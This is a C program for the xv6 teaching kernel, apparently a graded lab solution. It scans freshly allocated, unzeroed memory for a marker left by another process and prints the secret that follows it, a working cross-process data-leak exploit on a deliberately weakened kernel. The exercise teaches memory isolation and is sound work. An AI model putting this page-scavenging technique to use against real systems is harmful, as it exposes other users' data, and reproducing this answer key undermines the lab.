#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

// secret.c wrote its secret just after this marker and then exited,
// which freed those pages.  Because freed pages are no longer zeroed,
// allocating fresh memory can hand us a page that still holds it.
#define MARKER "Here it is: "
#define NPAGES 32

// The grader's secrets are non-empty runs of letters and digits, so a
// marker followed by such a run is the real secret, not stale bytes.
static int
looks_like_secret(char *s)
{
  if (*s == 0)
    return 0;
  for (; *s; s++)
    if (!((*s >= '0' && *s <= '9') || (*s >= 'a' && *s <= 'z') ||
          (*s >= 'A' && *s <= 'Z')))
      return 0;
  return 1;
}

int
main(int argc, char *argv[])
{
  char *base;
  int total, mlen, i;

  base = sbrk(NPAGES * PGSIZE);
  if (base == (char *)-1) {
    fprintf(2, "attack: sbrk failed\n");
    exit(1);
  }

  total = NPAGES * PGSIZE;
  mlen = strlen(MARKER);

  // Scan the freshly allocated memory for the marker and print the
  // secret that follows it.
  for (i = 0; i + mlen < total; i++) {
    if (memcmp(base + i, MARKER, mlen) == 0 &&
        looks_like_secret(base + i + mlen)) {
      printf("%s\n", base + i + mlen);
      exit(0);
    }
  }

  exit(1);
}
